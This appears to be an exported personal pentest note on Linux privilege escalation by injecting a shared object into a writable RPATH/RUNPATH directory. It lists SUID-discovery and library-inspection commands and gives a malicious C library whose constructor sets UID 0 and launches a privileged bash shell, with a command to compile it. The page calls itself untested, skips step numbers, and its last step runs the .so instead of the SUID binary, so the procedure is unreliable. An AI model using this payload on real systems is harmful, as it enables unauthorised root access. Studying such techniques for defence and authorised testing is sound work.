<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Shared Object Injection (RPATH, RUNPATH)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Shared Object Injection (RPATH, RUNPATH)</h1><br /><br /><strong>
      <h3>Executable compiled with RPATH or RUNPATH, that load a Shared Object</h3>
    </strong><br /><strong>CVE-2017-16997</strong>: <a
      href="https://www.cvedetails.com/cve/CVE-2017-16997/" target="_blank">https://www.cvedetails.com/cve/CVE-2017-16997/</a><br />
    <strong><span style="color:#ff0000;">VERY UNCOMMON VULNERABILITY</span></strong><br /> <strong><span
        style="color:#ff0000;">NOT TESTED</span></strong><br />• When a program is executed, it will try to load the
    shared objects it requires.<br />• By using a program called <strong>ldd</strong> or <strong>strace</strong>, we can
    determine the shared object libraries that are being loaded by an executable.<br />• Determine if the application
    was compiled with RPATH or RUNPATH options.<br /> If yes, can we write into the locations specified by the either of
    those options?<br /><br /> 0. <a
      href="entest--Post_Exploitation--Privilege_Escalation--Linux_Privilege_Escalation--Automated_Recon_with_Tools--Linux_Smart_Enumeration_(lse.sh).html">Linux
      Smart Enumeration(lse.sh)</a><br />
    <div class="codebox">
      <div class="codebox">target@debian:~$&nbsp;./lse.sh&nbsp;-i&nbsp;|&nbsp;more</div>
    </div><br /> <a href=""><img src="images/1456-1.png" alt="images/1456-1.png" /></a><br />1. manually locate files
    with the SUID or SGID bits set:<br />
    <div class="codebox">
      <div class="codebox">
        target@debian:~$&nbsp;find&nbsp;/&nbsp;-type&nbsp;f&nbsp;-a&nbsp;\(&nbsp;-perm&nbsp;-u+s&nbsp;-o&nbsp;-perm&nbsp;-g+s&nbsp;\)&nbsp;-exec&nbsp;ls&nbsp;-l&nbsp;{}&nbsp;\;&nbsp;2&gt;&nbsp;/dev/null
      </div>
    </div><br /> <a href=""><img src="images/1456-2.png" alt="images/1456-2.png" /></a><br /> <a href=""><img
        src="images/1456-3.png" alt="images/1456-3.png" /></a><br /> Check for executable that should execute with <span
      style="color:#1e90ff;">SUID permissions</span><br /><br />2. Run <code>ldd</code> on the SUID file<br />
    <div class="codebox">
      <div class="codebox">target@debian:~$&nbsp;ldd&nbsp;<span
          style="color:#000000;font-weight:400">&lt;</span>executable<span
          style="color:#000000;font-weight:400">&gt;</span></div>
    </div><br /> <a href=""><img src="images/1456-4.png" alt="images/1456-4.png" /></a><br />3. Check if the executable
    was compiled with RPATH or RUNPATH options.<br /> If yes, we will be able to drop our payload in the directories
    defined by either of those options <br />
    <div class="codebox">
      <div class="codebox">
        target@debian:~$&nbsp;objdump&nbsp;-x&nbsp;&lt;executable&gt;&nbsp;|&nbsp;grep&nbsp;RPATH<br />target@debian:~$&nbsp;objdump&nbsp;-x&nbsp;&lt;executable&gt;&nbsp;|&nbsp;grep&nbsp;RUNPATH
      </div>
    </div><br /> <a href=""><img src="images/1456-5.png" alt="images/1456-5.png" /></a><br />6. Create the /tmp/program
    directory. If it not exist already:<br />
    <div class="codebox">
      <div class="codebox">target@debian:~$&nbsp;mkdir&nbsp;/tmp/program/main</div>
    </div><br />7. Choose one of the shared library loaded by the executable and create your own shared library.<br />
    For example in this case create the file libContext.c with the following contents:<br />
    <div class="codebox">
      <div class="codebox">
        #include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;stdlib.h&gt;<br />static&nbsp;void&nbsp;inject()&nbsp;__attribute__((constructor));<br />void&nbsp;inject()&nbsp;<span
          style="color:#000000;font-weight:400">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;setuid(0);<br />&nbsp;&nbsp;&nbsp;&nbsp;system(&quot;/bin/bash&nbsp;-p&quot;);<br /><span
          style="color:#000000;font-weight:400">}</span></div>
    </div><br />10. Compile libContext.c into /tmp/program/main/libContext.so:<br />
    <div class="codebox">
      <div class="codebox">
        target@debian:~$&nbsp;gcc&nbsp;-shared&nbsp;-fPIC&nbsp;-o&nbsp;/tmp/program/main/libContext.so&nbsp;libContext.c
      </div>
    </div><br />11. Run the SUID executable to get a root shell:<br />
    <div class="codebox">
      <div class="codebox">target@debian:~$&nbsp;/tmp/program/main/libContext.so</div>
    </div><br /> <br /><a href=""><img src="images/1456-6.png" alt="images/1456-6.png" /></a><br /><br />When a Linux
    application is executed, if it uses Shared Objects, is that it will search for those Shared Objects in the following
    search order:<br />1. Any directories specified by -rpath-link options. ( RPATH )<br />2. Any directories specified
    by -rpath options. ( RPATH )<br />3. If the -rpath and -rpath-link options are not used, it will then search the
    contents of the environment variables LD_RUN_PATH and LD_LIBRARY_PATH.<br />4. Directories defined in the DT_RUNPATH
    environment variable first, if that doesn’t exist, then the DT_RPATH<br />5. Then, the default lib directories,
    normally /lib and /usr/lib .<br />6. Finally, any directories defined in the /etc/ld.so.conf
    file.<br /><br />Bibliography:<br />• <a
      href="https://www.contextis.com/en/blog/linux-privilege-escalation-via-dynamically-linked-shared-object-library" target="_blank">https://www.contextis.com/en/blog/linux-privilege-escalation-via-dynamically-linked-shared-object-library</a><br />•
    <a
      href="https://ftp.gnu.org/old-gnu/Manuals/ld-2.9.1/html_node/ld_3.html" target="_blank">https://ftp.gnu.org/old-gnu/Manuals/ld-2.9.1/html_node/ld_3.html</a>
  </div>
</body>

</html>